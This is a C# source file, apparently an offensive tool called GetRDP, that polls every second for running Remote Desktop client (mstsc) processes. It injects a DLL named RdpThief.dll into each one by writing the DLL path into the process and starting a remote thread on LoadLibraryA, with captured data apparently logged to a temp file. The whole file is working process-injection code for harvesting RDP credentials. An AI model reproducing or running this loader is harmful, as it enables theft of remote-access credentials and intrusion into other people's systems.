using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace GetRDP
{
    class Program
    {
        #region ImportAPI
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        #endregion

        public static string DllName { get { return @"C:\Tools\RdpThief.dll"; } set { DllName = value;} }
        private static readonly string logFilePath = Path.GetTempPath() + "data.bin";

        static void Main()
        {
            if (!File.Exists(DllName))
            {
                Console.WriteLine($"Couldn't found {DllName}");
                return;
            }
            

            Console.WriteLine($"Monitoring for mstsc instances.\n" +
                $"Logs are being saved at {logFilePath}");

            /* Look forever for mstsc processes and inject the DLL into each one of them*/
            while (true)
            {
                Process[] proc = Process.GetProcessesByName("mstsc");
                if (proc.Length > 0)
                {
                    for (int i = 0; i < proc.Length; i++)
                    {
                        Inject( proc[i].Id );
                    }
                }
                Thread.Sleep(1000);
            }
        }
        private static void Inject(int pid)
        {
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
            
            /* Allocate RW memory in the remote process to write the DLL */
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x4);

            /* Write the DLL into memory*/
            Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(DllName), DllName.Length, out _);
            if (res) Console.WriteLine($"Succesfully wrote to mstsc process at PID: {pid}");

            /* Find LoadLibraryA address and use it to start a new thread and run the DLL written in the remote process */
            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
        }
    }
}
